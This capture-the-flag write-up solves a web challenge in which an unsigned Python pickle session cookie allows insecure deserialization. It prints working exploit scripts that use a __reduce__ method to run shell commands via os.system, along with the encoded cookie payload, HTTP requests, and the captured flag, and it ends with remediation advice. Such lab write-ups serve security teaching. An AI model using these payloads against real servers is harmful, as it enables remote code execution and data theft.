

**Challenge Name:** Milkshake Shop  
**Category:** Web Exploitation  
**Difficulty:** Medium  

## 1. Reconnaissance & Tech Stack Analysis

I started by navigating to the target URL to understand the application's functionality. The site is a milkshake ordering platform where users can log in, customize milkshakes, and place orders.

### Identifying the Tech Stack

I inspected the HTTP response headers using Burp Suite to identify the backend technologies.

**Request:**

```http
GET / HTTP/1.1
Host: labs.ctfzone.com:<PORT>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.11.14
Date: Mon, 05 Jan 2026 12:42:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3622
Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; Path=/
Connection: close
...
```

**Key Finding:** The `Server` header explicitly identified the stack as **Python 3.11.14** running on **Werkzeug/3.0.1**. This strongly suggested a **Flask** application.

## 2. Vulnerability Hunting

### Attempt 1: Server-Side Template Injection (SSTI)

Given that it is a Flask application, my first instinct was to check for SSTI in the input fields. The "Order" page accepts user input (flavors, toppings) and reflects it on the "Confirmation" page.

I intercepted the `POST /order/confirm` request and injected a standard Jinja2 payload:

**Payload:** `{{7*7}}`

**Response:** The server reflected `{{7*7}}` literally in the HTML, rather than evaluating it to `49`. This indicated that the input was properly sanitized or treated as a string, so SSTI was a dead end.

### Discovery: The Suspicious Cookie

I then turned my attention to the session management. I noticed the session cookie set by the server:

`Cookie: session=gASVJAAAAAAAAAB9lCiMB3VzZXJfaWSUSwGMCHVzZXJuYW1llIwFdXNlcjOUdS4=`

in GET /order:

```http
GET /order HTTP/1.1
Host: labs.ctfzone.com:<PORT>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://labs.ctfzone.com:8594/order
Accept-Encoding: gzip, deflate, br
Cookie: session=gASVJAAAAAAAAAB9lCiMB3VzZXJfaWSUSwGMCHVzZXJuYW1llIwFdXNlcjOUdS4=
Connection: keep-alive

```

I analyzed this string:

1. **Base64 Encoded:** Standard for cookies.
2. **Prefix `gAS`:** When decoded, this signature corresponds to the **Python Pickle** protocol.
3. **No Signature:** Secure Flask sessions usually look like `ey... .Signature`. This cookie lacked the cryptographic signature component.

**Vulnerability:** The application is using insecure **Python Pickle serialization** for session management. By modifying this cookie, I can force the server to deserialize a malicious object, leading to **Remote Code Execution (RCE)**.

## 3. Exploitation

### The Attack Vector: `__reduce__`

Python's `pickle` module allows objects to define a `__reduce__` method, which returns a callable and arguments to run during deserialization. I can use this to execute `os.system()` commands.

### The Strategy: Blind RCE

Since the server redirects to `/login` when the session data is corrupted by my payload, I cannot see the command output directly in the HTTP response (Blind RCE).

**Plan:**

1. Craft a malicious pickle object that executes a shell command.
2. Redirect the output of the command to a file in the static directory (`static/ctfzone.txt`) which is publicly readable.
3. Read the file via the browser.

### Step 1: Reconnaissance (Listing Files)

I wrote a Python script to generate the payload. I first wanted to list the files in the current directory to locate the flag.

**Exploit Script:**

Python

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        # List files and write to static folder
        cmd = "ls -la > static/ctfzone.txt"
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

**Execution:**

1. I ran the script to get the base64 payload.
`gASVNgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBtscyAtbGEgPiBzdGF0aWMvY3Rmem9uZS50eHSUhZRSlC4=
`
2. I replaced my browser's `session` cookie with this payload.
```http
GET /order HTTP/1.1
Host: labs.ctfzone.com:<PORT>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://labs.ctfzone.com:6707/order/success/1
Accept-Encoding: gzip, deflate, br
Cookie: session=gASVNgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBtscyAtbGEgPiBzdGF0aWMvY3Rmem9uZS50eHSUhZRSlC4=
Connection: keep-alive

```
 
3. I refreshed the page. The server responded with a redirect (302) to login, indicating the payload executed but the session was invalid.

4. I navigated to `/static/ctfzone.txt`.
```http
GET /static/ctfzone.txt HTTP/1.1
Host: labs.ctfzone.com:<PORT>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://labs.ctfzone.com:6707/order/success/1
Accept-Encoding: gzip, deflate, br
Cookie: session=gASVNgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBtscyAtbGEgPiBzdGF0aWMvY3Rmem9uZS50eHSUhZRSlC4=
Connection: keep-alive
```

**Result:** The file listing appeared. I saw `flag.txt` in the root directory.

```http
total 56
drwxr-xr-x 1 appuser appuser 4096 Dec 22 10:42 .
drwxr-xr-x 1 root    root    4096 Jan  5 12:38 ..
-rw-r--r-- 1 appuser appuser 6530 Dec 22 10:40 app.py
-rw-r--r-- 1 appuser appuser  772 Dec 22 10:40 config.py
-rw-r--r-- 1 appuser appuser 1050 Dec 22 10:40 docker-entrypoint.sh
-rw-r--r-- 1 appuser appuser   53 Dec 22 10:40 flag.txt
drwxr-xr-x 1 appuser appuser 4096 Jan  5 12:53 instance
-rw-r--r-- 1 appuser appuser 1447 Dec 22 10:40 models.py
-rw-r--r-- 1 appuser appuser   60 Dec 22 10:40 requirements.txt
drwxr-xr-x 1 appuser appuser 4096 Jan  5 12:53 static
drwxr-xr-x 1 appuser appuser 4096 Dec 22 10:40 templates

```

### Step 2: Retrieving the Flag

I modified the script to read the content of the flag file.

**Revised Exploit Script:**

Python

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        # Read the flag file
        cmd = "cat flag.txt > static/flag.txt"
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

I repeated the injection process with the new cookie then navigated to `/static/flag.txt` 


## 4. The Solution

After injecting the second payload and refreshing the page, I navigated to: `http://labs.ctfzone.com:<PORT>/static/flag.txt`

**The Flag:** ```
urchinsec{1ns3cure_D3s3RIALIZATION_r1s_just_Cr4zyyy}```

## 5. Conclusion

The "Milkshake Shop" was vulnerable to **Insecure Deserialization** via the Python `pickle` module. The developer failed to sign the session cookies, allowing an attacker to replace the session object with a malicious one containing a `__reduce__` method. This allowed for arbitrary code execution on the server.

**Remediation:**

- Never use `pickle` for untrusted data. Use `json` instead.
- If using Flask sessions, ensure `SECRET_KEY` is set and strong to sign the cookies securely.

# Note: replace the instance with you own instance URL.
